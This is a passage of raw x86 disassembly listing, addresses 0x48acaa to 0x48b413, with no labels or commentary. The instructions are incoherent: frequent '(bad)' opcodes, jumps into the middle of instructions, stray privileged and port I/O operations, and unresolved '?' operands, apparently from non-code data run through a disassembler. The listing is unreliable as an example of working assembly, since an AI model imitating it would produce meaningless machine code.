  48acaa:	and    DWORD PTR [edi+eax*8],esp
  48acad:	jo     0x48ace8
  48acaf:	aam    0x43
  48acb1:	mov    esi,0x145408a1
  48acb6:	mov    DWORD PTR [edx+0xf],ecx
  48acb9:	sub    al,0x30
  48acbb:	ret    0xc7d
  48acbe:	(bad)  
  48acbf:	mov    ebp,0x52946a55
  48acc4:	pop    esi
  48acc5:	add    al,0xcc
  48acc7:	inc    eax
  48acc8:	or     ah,BYTE PTR [esp+ebp*1+0x5f]
  48accc:	lock lea ecx,[edi]
  48accf:	nop
  48acd0:	pop    ss
  48acd1:	lahf   
  48acd2:	fimul  WORD PTR [edi]
  48acd4:	cmp    ecx,DWORD PTR [ebp+0x14]
  48acd7:	je     0x48ad15
  48acd9:	sub    DWORD PTR [eax],edi
  48acdb:	xor    DWORD PTR [ecx],0xb3b0daa6
  48ace1:	stos   BYTE PTR es:[edi],al
  48ace2:	and    eax,0x74bd0244
  48ace7:	pop    ds
  48ace8:	mov    esi,0x2d15e13d
  48aced:	ss inc ebx
  48acef:	adc    BYTE PTR [edi],dh
  48acf1:	jl     0xe806aebd
  48acf7:	sahf   
  48acf8:	push   edi
  48acf9:	inc    ecx
  48acfa:	jge    0x991468bd
  48ad00:	or     al,0x6
  48ad02:	sub    BYTE PTR [edx+0xa2f8591],cl
  48ad08:	pop    esp
  48ad09:	xor    eax,0xc98430ae
  48ad0e:	cmp    BYTE PTR [edx],bh
  48ad10:	jmp    0x48ad11
  48ad12:	pop    edi
  48ad13:	add    edi,edx
  48ad15:	(bad)  
  48ad16:	mov    eax,DWORD PTR [eax]
  48ad18:	imul   eax,eax,0x15
  48ad1b:	movzx  eax,BYTE PTR [eax+ebx*1-0x4eb6e710]
  48ad23:	test   DWORD PTR [ecx-0x72edb9e8],ebp
  48ad29:	outs   dx,BYTE PTR ds:[esi]
  48ad2a:	add    eax,eax
  48ad2c:	cmp    eax,0x6726b2c0
  48ad31:	adc    edx,DWORD PTR [ebp-0x6c]
  48ad34:	pop    ebp
  48ad35:	scas   al,BYTE PTR es:[edi]
  48ad36:	mov    ?,WORD PTR [edx]
  48ad38:	rol    BYTE PTR [eax-0x7a],0x16
  48ad3c:	pop    ds
  48ad3d:	jo     0x48ad86
  48ad3f:	or     BYTE PTR [edi+edi*1],bl
  48ad42:	aam    0x81
  48ad44:	div    BYTE PTR [ebp-0x12]
  48ad47:	mov    DWORD PTR [edi+0x6b],ecx
  48ad4a:	push   ebp
  48ad4b:	sub    DWORD PTR [eax+0x18],edi
  48ad4e:	push   ss
  48ad4f:	jmp    0x81d2262f
  48ad54:	mov    edx,0xfec46d7b
  48ad59:	lock (bad) 
  48ad5b:	je     0x48adc4
  48ad5d:	mov    esi,0x20ea19f
  48ad62:	repnz in al,0xc9
  48ad65:	and    esp,DWORD PTR [ecx+0xebf0ea7]
  48ad6b:	retf   
  48ad6c:	push   cs
  48ad6d:	or     al,0xa2
  48ad6f:	cmp    edi,DWORD PTR [ecx-0x32]
  48ad72:	push   cs
  48ad73:	jecxz  0x48ad85
  48ad75:	lahf   
  48ad76:	imul   eax,esi,0x9
  48ad79:	sub    BYTE PTR [esi-0x62],al
  48ad7c:	mov    ds:0xb4aa0ea1,al
  48ad81:	sti    
  48ad82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48ad83:	imul   edx,esp,0x46
  48ad86:	sub    al,0xf0
  48ad88:	push   ss
  48ad89:	cmp    al,bh
  48ad8b:	dec    ebx
  48ad8c:	xchg   edi,eax
  48ad8d:	lods   al,BYTE PTR ds:[esi]
  48ad8e:	pop    ss
  48ad8f:	sub    al,BYTE PTR [ecx+edx*4]
  48ad92:	inc    ebx
  48ad93:	hlt    
  48ad94:	sbb    dh,cl
  48ad96:	lock shl BYTE PTR [edi+0x20],1
  48ad9a:	inc    eax
  48ad9b:	sub    BYTE PTR [ebx],al
  48ad9d:	jecxz  0x48ad29
  48ad9f:	xchg   ebp,eax
  48ada0:	ds pop ds
  48ada2:	fadd   QWORD PTR [esi]
  48ada4:	sbb    BYTE PTR [ebx+0x10af1341],cl
  48adaa:	inc    ecx
  48adab:	or     ch,dl
  48adad:	mov    ds,WORD PTR [ecx+edi*1]
  48adb0:	mov    dl,0xb9
  48adb2:	adc    ch,dl
  48adb4:	adc    cl,ah
  48adb6:	adc    dh,ah
  48adb8:	adc    ah,cl
  48adba:	add    al,0x1e
  48adbc:	dec    esi
  48adbd:	adc    DWORD PTR [ebx],ebp
  48adbf:	jp     0x48adc6
  48adc1:	jae    0x48ae12
  48adc3:	sub    BYTE PTR [ebp+ecx*1-0x5ffbf7c0],al
  48adca:	xchg   esp,eax
  48adcb:	jo     0x48ada4
  48adcd:	xchg   ebp,esi
  48adcf:	push   esi
  48add0:	gs jo  0x48add2
  48add3:	pop    ecx
  48add4:	mov    bh,0xf7
  48add6:	mov    edx,esi
  48add8:	and    BYTE PTR [edi+edi*8],0x7
  48addc:	cmp    BYTE PTR [eax+0xfc85fd],0xda
  48ade3:	sub    DWORD PTR [eax],ecx
  48ade5:	retf   0xfe18
  48ade8:	rcl    DWORD PTR [eax],cl
  48adea:	retf   
  48adeb:	adc    al,0x7c
  48aded:	add    BYTE PTR [edi+0x568c1aa],dh
  48adf3:	sbb    al,0x72
  48adf5:	push   0x54a13618
  48adfa:	add    DWORD PTR [esi-0x1c],esp
  48adfd:	leave  
  48adfe:	dec    ecx
  48adff:	sahf   
  48ae00:	sbb    BYTE PTR [edx],cl
  48ae02:	push   ds
  48ae03:	or     dh,BYTE PTR [esi]
  48ae05:	or     al,BYTE PTR [ebp+0x42f2793c]
  48ae0b:	or     al,BYTE PTR [ebp+0xa]
  48ae0e:	pop    edx
  48ae0f:	or     dl,BYTE PTR [ecx-0x5e3c1b44]
  48ae15:	lahf   
  48ae16:	inc    esi
  48ae17:	dec    esp
  48ae18:	or     bl,BYTE PTR [ebp+0xe706c25]
  48ae1e:	xor    eax,0x79e08bde
  48ae23:	enter  0x3896,0x12
  48ae27:	cmp    DWORD PTR [edx],ebp
  48ae29:	or     al,0x34
  48ae2b:	or     al,0x23
  48ae2d:	inc    edi
  48ae2e:	mov    ds,WORD PTR [eax+edx*2]
  48ae31:	or     al,0x60
  48ae33:	or     al,0x67
  48ae35:	or     al,0x80
  48ae37:	lock retf 0x9070
  48ae3b:	or     al,0x89
  48ae3d:	or     esp,DWORD PTR [eax]
  48ae3f:	dec    esi
  48ae40:	xchg   edi,eax
  48ae41:	cld    
  48ae42:	test   eax,0x9a156836
  48ae47:	ja     0x48ae77
  48ae49:	inc    eax
  48ae4a:	shr    BYTE PTR [esi-0xbd7e3d2],1
  48ae50:	sbb    dl,BYTE PTR [ebp-0x2a]
  48ae53:	cmp    BYTE PTR [edx+0x6d],ch
  48ae56:	int3   
  48ae57:	bndldx bnd1,[edi+0x4d]
  48ae5b:	push   es
  48ae5c:	clc    
  48ae5d:	mov    esi,0xed346770
  48ae62:	mov    esp,0xbc2c3aa2
  48ae67:	pop    es
  48ae68:	je     0x650be7d
  48ae6e:	and    dh,bh
  48ae70:	in     al,dx
  48ae71:	call   0xfbe3c344
  48ae76:	push   ecx
  48ae77:	ja     0xb440ab72
  48ae7d:	(bad)  [edi]
  48ae7f:	outs   dx,BYTE PTR ds:[esi]
  48ae80:	fwait
  48ae81:	dec    esp
  48ae82:	scas   eax,DWORD PTR es:[edi]
  48ae83:	mov    ds:0x41ec9db0,al
  48ae88:	mov    ebx,0x9d48e70d
  48ae8d:	adc    bl,BYTE PTR [edi+0xf]
  48ae90:	inc    esi
  48ae91:	cwde   
  48ae92:	cmp    DWORD PTR [edi+ecx*1+0x53],ecx
  48ae96:	jmp    0x48ae58
  48ae98:	push   esi
  48ae99:	mov    eax,ds:0x6a1a2142
  48ae9e:	sbb    cl,bl
  48aea0:	inc    esp
  48aea1:	or     esp,eax
  48aea3:	lock hlt 
  48aea5:	sbb    BYTE PTR [edx+eiz*2-0x54e44776],dh
  48aeac:	xchg   esi,eax
  48aead:	jb     0x48aedf
  48aeaf:	inc    ebx
  48aeb0:	xor    ah,al
  48aeb2:	mov    ecx,DWORD PTR [edx+esi*8-0x63]
  48aeb6:	int3   
  48aeb7:	cmp    BYTE PTR [eax+0x4a],ch
  48aeba:	sbb    BYTE PTR [edx-0x4441ff84],0xc5
  48aec1:	sbb    BYTE PTR [esp+edi*1+0x27],ah
  48aec5:	xchg   edi,eax
  48aec6:	dec    edi
  48aec7:	loopne 0x48aed2
  48aec9:	call   0x30acc38a
  48aece:	jle    0x48aecb
  48aed0:	(bad)  
  48aed1:	push   ss
  48aed2:	mov    edx,0xb774a3ec
  48aed7:	stos   DWORD PTR es:[edi],eax
  48aed8:	fisttp DWORD PTR [ecx-0x21d139e2]
  48aede:	mov    edx,0x6c35401f
  48aee3:	fwait
  48aee4:	pop    ss
  48aee5:	pop    edi
  48aee6:	push   0x1e7c7ebd
  48aeeb:	rcr    DWORD PTR [ecx+0x2136b9e7],0xad
  48aef2:	xor    edx,DWORD PTR [esi]
  48aef4:	rcr    DWORD PTR [edx],0x68
  48aef7:	aad    0xb0
  48aef9:	and    DWORD PTR [ebp-0x6e8cfff5],0x70
  48af00:	or     cl,BYTE PTR ds:0x107e9ff0
  48af06:	mov    ebx,DWORD PTR [ecx+eax*1]
  48af09:	in     eax,dx
  48af0a:	pop    es
  48af0b:	mov    esi,edi
  48af0d:	test   edi,edi
  48af0f:	ror    BYTE PTR [ecx+0x78],cl
  48af12:	jecxz  0x48ae95
  48af14:	or     DWORD PTR [edx+0x450ed614],edx
  48af1a:	test   BYTE PTR [eax+0x729d8a77],ch
  48af20:	in     eax,0x99
  48af22:	sub    al,0x4d
  48af24:	mov    al,ds:0x526d846b
  48af29:	call   0xd1dbcaf
  48af2e:	das    
  48af2f:	dec    ecx
  48af30:	add    DWORD PTR [esi+0x5d],edi
  48af33:	add    bl,bh
  48af35:	xor    cl,BYTE PTR [esp+esi*2-0x3ab0e597]
  48af3c:	in     eax,0xfd
  48af3e:	cmp    DWORD PTR [eax],0x12
  48af41:	je     0x48af96
  48af43:	push   ss
  48af44:	popa   
  48af45:	adc    al,0x3a
  48af47:	inc    ebp
  48af48:	(bad)  
  48af49:	rcr    BYTE PTR ds:0xe8548290,0x52
  48af50:	test   DWORD PTR [ecx],ebx
  48af52:	sub    ch,BYTE PTR [ecx+0x49]
  48af55:	or     dh,BYTE PTR [esi]
  48af57:	add    ebx,ebp
  48af59:	les    ebx,FWORD PTR [edx+edx*1]
  48af5c:	sbb    BYTE PTR [ebx],dl
  48af5e:	add    al,BYTE PTR [edx-0x6e]
  48af61:	add    DWORD PTR [ecx],ecx
  48af63:	loope  0x48af45
  48af65:	ins    DWORD PTR es:[edi],dx
  48af66:	mov    eax,ds:0x3d332c6c
  48af6b:	lock ins DWORD PTR es:[di],dx
  48af6e:	add    cl,BYTE PTR [edx-0x61f96915]
  48af74:	mov    edi,0xc02e345f
  48af79:	pop    ss
  48af7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48af7b:	adc    al,0x1f
  48af7d:	inc    esp
  48af7e:	lods   al,BYTE PTR ds:[esi]
  48af7f:	or     al,0x63
  48af81:	stc    
  48af82:	push   cs
  48af83:	or     eax,0xb21ee858
  48af88:	dec    esp
  48af89:	push   eax
  48af8a:	addr16 loopne 0x48afff
  48af8d:	loopne 0x48af65
  48af8f:	push   edx
  48af90:	push   eax
  48af91:	add    dh,BYTE PTR ss:[ecx-0x7f9e0e01]
  48af98:	(bad)  
  48af99:	mov    gs,WORD PTR ds:0x84333dc
  48af9f:	in     al,0x44
  48afa1:	int    0x94
  48afa3:	or     al,0x38
  48afa5:	adc    BYTE PTR [edi+0x13160a8b],0x8a
  48afac:	(bad)  
  48afad:	mov    eax,ds:0x1782259c
  48afb2:	in     al,0x83
  48afb4:	outs   dx,BYTE PTR ds:[esi]
  48afb5:	add    eax,DWORD PTR [edx]
  48afb7:	xchg   edx,eax
  48afb8:	and    al,0x21
  48afba:	dec    eax
  48afbb:	xor    esi,DWORD PTR [eax-0x6e43830e]
  48afc1:	or     eax,0x31ebbb6
  48afc6:	pop    ss
  48afc7:	rol    DWORD PTR [ebx+edi*1+0x97cce8b],0x6f
  48afcf:	mov    esi,0x27d4df32
  48afd4:	jl     0x7a6eaa10
  48afda:	add    al,0x41
  48afdc:	lea    ebx,[eax+0x6]
  48afdf:	rcl    BYTE PTR [eax+0x71],cl
  48afe2:	or     al,0x5f
  48afe4:	add    eax,0x68e85b1
  48afe9:	daa    
  48afea:	lock mov DWORD PTR [ecx-0x63],edx
  48afee:	sub    cl,BYTE PTR [ecx]
  48aff0:	add    BYTE PTR [ebx+ebx*2],cl
  48aff3:	clc    
  48aff4:	pop    esp
  48aff5:	pushf  
  48aff6:	out    dx,eax
  48aff7:	sbb    BYTE PTR [eax+eax*8],dl
  48affa:	lods   al,BYTE PTR ds:[esi]
  48affb:	jle    0x48b011
  48affd:	adc    dl,BYTE PTR [esp+esi*2+0x60]
  48b001:	mov    bh,0x3a
  48b003:	mov    esi,0x8eb3846c
  48b008:	jp     0x48b018
  48b00a:	clc    
  48b00b:	cmp    BYTE PTR [esi-0x2c7c5974],0x9d
  48b012:	sub    ebp,DWORD PTR [edx]
  48b014:	sub    DWORD PTR ds:0x3846b06b,0xffffffa6
  48b01b:	(bad)  
  48b01c:	pusha  
  48b01d:	mov    ch,0xa3
  48b01f:	or     ebx,esp
  48b021:	stc    
  48b022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b023:	test   ecx,esi
  48b025:	push   0xc4425c21
  48b02a:	int3   
  48b02b:	sbb    eax,0x1854ff8
  48b030:	push   ebx
  48b031:	cld    
  48b032:	jne    0x48afcb
  48b034:	mov    ds:0x1c963233,al
  48b039:	(bad)
  48b03c:	mov    bl,0x1
  48b03e:	mov    ah,0xcd
  48b040:	or     al,0x6d
  48b042:	out    dx,al
  48b043:	stos   BYTE PTR es:[edi],al
  48b044:	inc    eax
  48b045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b046:	push   es
  48b047:	nop
  48b048:	lods   al,BYTE PTR ds:[esi]
  48b049:	push   cs
  48b04a:	pop    ds
  48b04b:	iret   
  48b04c:	aaa    
  48b04d:	pop    edi
  48b04e:	sti    
  48b04f:	or     edi,DWORD PTR [eax+ebx*4-0x440af9df]
  48b056:	repnz lods eax,DWORD PTR ds:[esi]
  48b058:	inc    eax
  48b059:	add    BYTE PTR [ecx+edi*2-0xc19420a],bl
  48b060:	mov    al,0x42
  48b062:	add    bh,cl
  48b064:	shl    BYTE PTR [ecx+0xe4b1e09],cl
  48b06a:	jl     0x48b01f
  48b06c:	push   ss
  48b06d:	jns    0x48b06d
  48b06f:	jns    0x48b03e
  48b071:	push   ss
  48b072:	scas   al,BYTE PTR es:[edi]
  48b073:	rol    BYTE PTR [esi],0xb6
  48b076:	inc    esp
  48b077:	mov    dl,0x42
  48b079:	add    BYTE PTR [ebx+0x5e],ch
  48b07c:	jns    0x48b06d
  48b07e:	jns    0x48b06f
  48b080:	int3   
  48b081:	xchg   esi,eax
  48b082:	fstp   DWORD PTR [esi+0x3d56aafe]
  48b088:	push   ss
  48b089:	push   ecx
  48b08a:	add    edx,esp
  48b08c:	jnp    0x48b07c
  48b08e:	out    0xf,al
  48b090:	ds js  0x48b099
  48b093:	cmp    BYTE PTR [eax-0x9f09d9c],ch
  48b099:	push   ds
  48b09a:	pop    ss
  48b09b:	add    DWORD PTR [edx],eax
  48b09d:	pop    ss
  48b09e:	pop    ds
  48b09f:	add    esp,DWORD PTR [eax]
  48b0a1:	xchg   esi,eax
  48b0a2:	mov    esp,0x5041c2d
  48b0a7:	push   es
  48b0a8:	pop    es
  48b0a9:	and    eax,0x831eff6c
  48b0ae:	or     eax,0x11100f0e
  48b0b3:	adc    dl,BYTE PTR [ebx]
  48b0b5:	adc    al,0x1c
  48b0b7:	adc    eax,0x8e10016
  48b0bc:	pop    eax
  48b0bd:	mov    edi,0x95b55e13
  48b0c2:	loopne 0x48b0c1
  48b0c4:	(bad)  
  48b0c5:	push   edi
  48b0c6:	mov    eax,DWORD PTR [eax+0x17]
  48b0c9:	cmp    edx,0x22
  48b0cc:	outs   dx,DWORD PTR ds:[esi]
  48b0cd:	or     eax,0xfc1e200c
  48b0d2:	in     eax,dx
  48b0d3:	mov    cl,0x85
  48b0d5:	pop    ebx
  48b0d6:	loopne 0x48b05e
  48b0d8:	in     al,dx
  48b0d9:	leave  
  48b0da:	adc    esp,DWORD PTR [edx]
  48b0dc:	add    bh,bh
  48b0de:	popa   
  48b0df:	cmc    
  48b0e0:	add    al,0xa2
  48b0e2:	dec    ecx
  48b0e3:	popa   
  48b0e4:	push   esp
  48b0e5:	adc    ecx,DWORD PTR [ecx]
  48b0e7:	jg     0x48b12d
  48b0e9:	mov    DWORD PTR [ebx],esi
  48b0eb:	shr    BYTE PTR [edx-0x1],0x64
  48b0ef:	xor    al,0x1
  48b0f1:	mov    esp,0xe0043c25
  48b0f6:	push   0x5093200a
  48b0fb:	int3   
  48b0fc:	into   
  48b0fd:	mov    bl,0xd9
  48b0ff:	fcmovnbe st,st(3)
  48b101:	sbb    BYTE PTR ds:0xef7821eb,0x3
  48b108:	(bad)  
  48b109:	dec    edx
  48b10a:	inc    ebp
  48b10b:	ret    0x7b4a
  48b10e:	adc    BYTE PTR [eax],bh
  48b110:	pop    eax
  48b111:	or     eax,0x858e524
  48b116:	dec    esp
  48b117:	cmp    esp,esp
  48b119:	xor    DWORD PTR [ecx-0x5f],ecx
  48b11c:	fcomp  DWORD PTR [eax+0x5d]
  48b11f:	xlat   BYTE PTR ds:[ebx]
  48b120:	and    DWORD PTR [ebx],esp
  48b122:	inc    edi
  48b123:	mov    ?,WORD PTR [ebx*8+0x121f521]
  48b12a:	and    al,BYTE PTR [edx+eiz*4]
  48b12d:	pop    edi
  48b12e:	enter  0x2291,0x19
  48b132:	and    dl,BYTE PTR [ebp-0x24]
  48b135:	mov    DWORD PTR [ebx+0x78],edx
  48b138:	pop    ss
  48b139:	mov    dl,0x93
  48b13b:	add    al,0x4
  48b13d:	arpl   WORD PTR [edi],cx
  48b13f:	and    al,BYTE PTR [esi-0x64dea7dc]
  48b145:	and    ecx,DWORD PTR [ebp-0x20]
  48b148:	inc    esi
  48b149:	or     ebp,ebp
  48b14b:	jae    0x48b175
  48b14d:	lds    ebx,FWORD PTR [edi+0x23]
  48b150:	adc    BYTE PTR [ecx],al
  48b152:	es loopne 0x48b1b7
  48b155:	sub    al,0x25
  48b157:	mov    esp,0x708d2496
  48b15c:	or     al,0x12
  48b15e:	repnz xchg esp,eax
  48b160:	xchg   edi,eax
  48b161:	ins    BYTE PTR es:[edi],dx
  48b162:	mov    WORD PTR [esi],cs
  48b164:	icebp  
  48b165:	dec    eax
  48b166:	and    eax,DWORD PTR [ebp-0x20]
  48b169:	sahf   
  48b16a:	cmp    al,0x79
  48b16c:	loopne 0x48b163
  48b16e:	jp     0x48b1b7
  48b170:	and    esp,DWORD PTR [ecx+0x23]
  48b173:	outs   dx,BYTE PTR ds:[esi]
  48b174:	and    ecx,DWORD PTR [edi]
  48b176:	push   es
  48b177:	daa    
  48b178:	dec    edi
  48b179:	jb     0x48b19e
  48b17b:	mov    DWORD PTR [ecx],ebx
  48b17d:	lods   al,BYTE PTR ds:[esi]
  48b17e:	push   ebp
  48b17f:	adc    ecx,DWORD PTR [eax]
  48b181:	inc    ebp
  48b182:	push   0x81584aac
  48b187:	or     DWORD PTR [eax+0x7e06b05],ecx
  48b18d:	inc    edi
  48b18e:	or     dh,al
  48b190:	sbb    DWORD PTR [ecx-0x8],0x21070f15
  48b197:	sub    edx,0x4
  48b19a:	cmp    ah,BYTE PTR [esi]
  48b19c:	ja     0x184ad216
  48b1a2:	push   0xffffffc7
  48b1a4:	sbb    eax,0xb364952e
  48b1a9:	cmp    BYTE PTR [ebp+0xe1aa686],cl
  48b1af:	mov    eax,ds:0x5d9b76a0
  48b1b4:	loopne 0x48b17a
  48b1b6:	or     al,0xf8
  48b1b8:	and    BYTE PTR [edi+0x6b],0x9
  48b1bc:	mov    BYTE PTR [esi],dl
  48b1be:	sbb    DWORD PTR [eax-0x3e],edi
  48b1c1:	jge    0x48b1b7
  48b1c3:	cmp    DWORD PTR [edi+0x28],0xffffffe7
  48b1c7:	adc    DWORD PTR [edx+0x28],0x2a6a5760
  48b1ce:	push   cs
  48b1cf:	sbb    DWORD PTR [edi],ebp
  48b1d1:	adc    BYTE PTR [edi],bh
  48b1d3:	in     eax,dx
  48b1d4:	jg     0x48b1ee
  48b1d6:	add    eax,0x778d5912
  48b1db:	and    BYTE PTR [edi],ah
  48b1dd:	or     edx,DWORD PTR [esi+esi*8-0x1f155a3f]
  48b1e4:	cmp    eax,ebx
  48b1e6:	push   0xffffffd0
  48b1e8:	cmp    DWORD PTR [ecx-0xe],0xffffffe4
  48b1ec:	leave  
  48b1ed:	rcr    BYTE PTR [ecx],cl
  48b1ef:	in     al,dx
  48b1f0:	sbb    ecx,edi
  48b1f2:	sbb    ebp,edi
  48b1f4:	sbb    edi,eax
  48b1f6:	iret   
  48b1f7:	fstp   TBYTE PTR [esp+edx*1]
  48b1fa:	sbb    bl,cl
  48b1fc:	out    dx,al
  48b1fd:	cli    
  48b1fe:	add    ebx,ecx
  48b200:	rcr    ch,0x16
  48b203:	les    eax,FWORD PTR ds:0x8dac055f
  48b209:	adc    al,0x40
  48b20b:	shl    edx,0x9e
  48b20e:	mov    dh,ah
  48b210:	and    DWORD PTR [edi-0x41],edi
  48b213:	scas   al,BYTE PTR es:[edi]
  48b214:	test   eax,0x4a04f94c
  48b219:	and    esi,DWORD PTR [ecx-0x242622f0]
  48b21f:	push   es
  48b220:	dec    edx
  48b221:	add    esi,DWORD PTR [edi-0x20262103]
  48b227:	loopne 0x48b21f
  48b229:	les    esp,FWORD PTR [edx-0x31dfe175]
  48b22f:	out    dx,eax
  48b230:	(bad)  [edi+0x6e52df5e]
  48b236:	ja     0x48b248
  48b238:	lea    ecx,[eax+eax*2]
  48b23b:	add    al,0x8a
  48b23d:	mov    ecx,DWORD PTR [ecx*4-0x43c78818]
  48b244:	daa    
  48b245:	fwait
  48b246:	add    DWORD PTR [edi],edi
  48b248:	sbb    ebp,DWORD PTR [eax+0x1c]
  48b24b:	push   esp
  48b24c:	ss cs or bh,bh
  48b250:	jl     0x48b1d8
  48b252:	jmp    DWORD PTR [eax]
  48b254:	or     al,0x1d
  48b256:	add    DWORD PTR [ebx],edi
  48b258:	lock jl 0x48b2cc
  48b25b:	sub    al,0x16
  48b25d:	pop    ss
  48b25e:	dec    edx
  48b25f:	test   al,0x6a
  48b261:	inc    edx
  48b262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b263:	mov    dl,0x3d
  48b265:	test   bl,dl
  48b267:	push   ss
  48b268:	push   ss
  48b269:	cmp    ecx,ebx
  48b26b:	cmp    BYTE PTR [esi-0x1b8d592f],bl
  48b271:	enter  0x1d91,0xc0
  48b275:	sbb    eax,0x1dd11dcd
  48b27a:	add    BYTE PTR [eax-0x166c6a8],0xc0
  48b281:	cwde   
  48b282:	enter  0x630a,0xf8
  48b286:	ret    0xbc55
  48b289:	int3   
  48b28a:	in     eax,dx
  48b28b:	shl    BYTE PTR [edi+edi*4],0x4a
  48b28f:	jp     0x48b2e3
  48b291:	daa    
  48b292:	scas   eax,DWORD PTR es:[edi]
  48b293:	sbb    al,0x7d
  48b295:	pusha  
  48b296:	out    dx,eax
  48b297:	push   ebx
  48b298:	jg     0x48b2c8
  48b29a:	mov    bh,0x8c
  48b29c:	jmp    0x48b22c
  48b29e:	stos   DWORD PTR es:[edi],eax
  48b29f:	sbb    DWORD PTR [ebx],edi
  48b2a1:	mov    ah,0x3d
  48b2a3:	test   DWORD PTR [ebx+0x14],edx
  48b2a6:	inc    ebx
  48b2a7:	clc    
  48b2a8:	cld    
  48b2a9:	sub    ebx,edi
  48b2ab:	pusha  
  48b2ac:	aas    
  48b2ad:	mov    eax,0xecd9dbb7
  48b2b2:	mov    ecx,0x202ce44c
  48b2b7:	leave  
  48b2b8:	cs and ebp,ebx
  48b2bb:	fisubr DWORD PTR [ebp+ebp*4+0x78]
  48b2bf:	xchg   edx,eax
  48b2c0:	popf   
  48b2c1:	mov    eax,0xff7ce323
  48b2c6:	mov    ecx,0xd1d6fcb2
  48b2cb:	cmp    al,0xed
  48b2cd:	fwait
  48b2ce:	jge    0x48b266
  48b2d0:	retf   0xeb07
  48b2d3:	push   ds
  48b2d4:	cmp    al,0xb3
  48b2d6:	push   es
  48b2d7:	sub    dl,BYTE PTR [eax+0x1e]
  48b2da:	jnp    0x48b2bb
  48b2dc:	repz adc eax,0xb16926cd
  48b2e2:	dec    edi
  48b2e3:	pop    es
  48b2e4:	jle    0x48b2b0
  48b2e6:	fcmovne st,st(0)
  48b2e8:	imul   BYTE PTR [ecx-0x72]
  48b2eb:	mov    dl,0xd0
  48b2ed:	outs   dx,BYTE PTR ds:[esi]
  48b2ee:	rcl    eax,0xd9
  48b2f1:	vmwrite ebx,DWORD PTR [esi+0x1fe99ef7]
  48b2f8:	inc    esi
  48b2f9:	xor    BYTE PTR [esi],al
  48b2fb:	inc    edx
  48b2fc:	push   esp
  48b2fd:	push   cs
  48b2fe:	xchg   BYTE PTR [eax-0x62],bh
  48b301:	out    0x66,eax
  48b303:	xor    DWORD PTR [edi-0x3c],0x2a
  48b307:	mov    edx,0xf7dded6e
  48b30c:	mov    dh,0x6
  48b30e:	(bad)  
  48b30f:	mov    bh,0x7
  48b311:	std    
  48b312:	xchg   BYTE PTR [eax-0x42],bl
  48b315:	in     al,0xf5
  48b317:	mov    esi,0x79a29eab
  48b31c:	call   0xa18f06b3
  48b321:	scas   al,BYTE PTR es:[edi]
  48b322:	add    BYTE PTR [eax],al
  48b324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b325:	fisub  WORD PTR [ecx+0x147e566d]
  48b32b:	test   al,0x4f
  48b32d:	push   ebx
  48b32e:	mov    ebx,DWORD PTR [edi-0x12]
  48b331:	or     eax,0x75620a88
  48b336:	ja     0x48b38c
  48b338:	pop    ebx
  48b339:	in     eax,dx
  48b33a:	inc    esi
  48b33b:	repnz repnz enter 0xcf91,0x5e
  48b341:	iret   
  48b342:	popf   
  48b343:	add    BYTE PTR [eax],al
  48b345:	popa   
  48b346:	iret   
  48b347:	inc    eax
  48b348:	jle    0x48b333
  48b34a:	aaa    
  48b34b:	jae    0x48b35d
  48b34d:	push   edi
  48b34e:	mov    DWORD PTR [edi+0x63],0x97485a07
  48b355:	sahf   
  48b356:	pop    edi
  48b357:	jne    0x48b36d
  48b359:	gs adc dl,al
  48b35c:	test   DWORD PTR [eax],esi
  48b35e:	repz call FWORD PTR [ebp-0x3079f4f6]
  48b365:	sbb    eax,0xc2fc2274
  48b36a:	cmp    DWORD PTR [esi-0x2b],ecx
  48b36d:	inc    edi
  48b36e:	int3   
  48b36f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b370:	cmp    eax,DWORD PTR [eax-0x24]
  48b373:	sbb    eax,0x81cf7c54
  48b378:	sbb    DWORD PTR [esi],esp
  48b37a:	mov    ecx,DWORD PTR [ebx]
  48b37c:	sub    bl,bh
  48b37e:	xchg   ebx,eax
  48b37f:	int3   
  48b380:	jge    0x48b3d5
  48b382:	enter  0xc78b,0x42
  48b386:	shr    BYTE PTR [esp+ebp*2+0x38],cl
  48b38a:	loopne 0x48b3ec
  48b38c:	push   ss
  48b38d:	mov    edi,0x4c20d310
  48b392:	hlt    
  48b393:	and    esp,ecx
  48b395:	inc    esi
  48b396:	jg     0x48b318
  48b398:	neg    BYTE PTR [ebx]
  48b39a:	hlt    
  48b39b:	sub    eax,0xc83b08c7
  48b3a0:	jne    0x48b3e5
  48b3a2:	xchg   edx,eax
  48b3a3:	push   ds
  48b3a4:	lea    esi,[eax+ebx*1]
  48b3a7:	cdq    
  48b3a8:	mov    edi,DWORD PTR [esi-0x40]
  48b3ab:	push   edi
  48b3ac:	(bad)  
  48b3ae:	cli    
  48b3af:	mov    eax,ebx
  48b3b1:	cdq    
  48b3b2:	add    ecx,eax
  48b3b4:	adc    ecx,DWORD PTR [esi+eax*8]
  48b3b7:	cdq    
  48b3b8:	aam    0x6
  48b3ba:	int3   
  48b3bb:	add    ebx,esp
  48b3bd:	push   edi
  48b3be:	les    ebx,FWORD PTR [edi]
  48b3c0:	mov    edx,0x47cbfe85
  48b3c5:	xor    cl,BYTE PTR [ebx+0x7036e9f2]
  48b3cb:	xor    eax,DWORD PTR [edi+0x71193219]
  48b3d1:	out    dx,al
  48b3d2:	adc    al,0x4c
  48b3d4:	pop    eax
  48b3d5:	repnz in al,dx
  48b3d7:	retf   
  48b3d8:	add    DWORD PTR [edi],esi
  48b3da:	sub    DWORD PTR [eax-0x473173ee],0x58dd9caa
  48b3e4:	cdq    
  48b3e5:	icebp  
  48b3e6:	xchg   edi,eax
  48b3e7:	pop    ebp
  48b3e8:	fld    QWORD PTR [ebp-0xc]
  48b3eb:	fstp   QWORD PTR [esi]
  48b3ed:	or     BYTE PTR [ebx+0x58],0xf8
  48b3f1:	mov    dh,0x1d
  48b3f3:	xchg   DWORD PTR [esp+ebx*8],esi
  48b3f6:	push   es
  48b3f7:	and    ch,bl
  48b3f9:	mov    ah,0x83
  48b3fb:	call   0x8bce4902
  48b400:	mov    cl,0x76
  48b402:	ja     0x48b3b0
  48b404:	cmp    BYTE PTR [ebp+esi*4+0x79ddf740],0xaf
  48b40c:	mov    ds:0x149d7e80,al
  48b411:	cwde   
  48b412:	push   cs
  48b413:	pop    esi
